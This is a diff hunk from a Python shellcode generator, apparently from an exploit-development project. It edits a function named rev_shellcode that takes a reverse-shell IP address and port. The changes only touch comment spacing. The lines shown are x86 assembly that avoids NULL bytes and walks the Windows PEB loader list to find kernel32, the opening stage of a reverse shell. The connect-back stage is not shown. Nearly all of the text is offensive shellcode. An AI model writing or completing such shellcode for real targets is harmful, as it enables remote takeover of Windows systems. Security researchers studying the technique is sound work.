@@ -89,17 +89,17 @@ def rev_shellcode(rev_ip_addr, rev_port, breakpoint=0):
     asm = [
         "   start:                               ",
         f"{['', 'int3;'][breakpoint]}            ",
-        "       mov ebp, esp                    ;", # 
-        "       add esp, 0xfffff9f0             ;", # Avoid NULL bytes
+        "       mov ebp, esp                    ;",  # 
+        "       add esp, 0xfffff9f0             ;",  # Avoid NULL bytes
         "   find_kernel32:                       ",
-        "       xor ecx,ecx                     ;", # ECX = 0
-        "       mov esi,fs:[ecx+30h]            ;", # ESI = &(PEB) ([FS:0x30])
-        "       mov esi,[esi+0Ch]               ;", # ESI = PEB->Ldr
-        "       mov esi,[esi+1Ch]               ;", # ESI = PEB->Ldr.InInitOrder
+        "       xor ecx,ecx                     ;",  # ECX = 0
+        "       mov esi,fs:[ecx+30h]            ;",  # ESI = &(PEB) ([FS:0x30])
+        "       mov esi,[esi+0Ch]               ;",  # ESI = PEB->Ldr
+        "       mov esi,[esi+1Ch]               ;",  # ESI = PEB->Ldr.InInitOrder
         "   next_module:                         ",
-        "       mov ebx, [esi+8h]               ;", # EBX = InInitOrder[X].base_address
-        "       mov edi, [esi+20h]              ;", # EDI = InInitOrder[X].module_name
-        "       mov esi, [esi]                  ;", # ESI = InInitOrder[X].flink (next)
+        "       mov ebx, [esi+8h]               ;",  # EBX = InInitOrder[X].base_address
+        "       mov edi, [esi+20h]              ;",  # EDI = InInitOrder[X].module_name
+        "       mov esi, [esi]                  ;",  # ESI = InInitOrder[X].flink (next)
         "       cmp [edi+12*2], cx              ;",  # (unicode) modulename[12] == 0x00?
         "       jne next_module                 ;",  # No: try next module.
         "   find_function_shorten:               ",
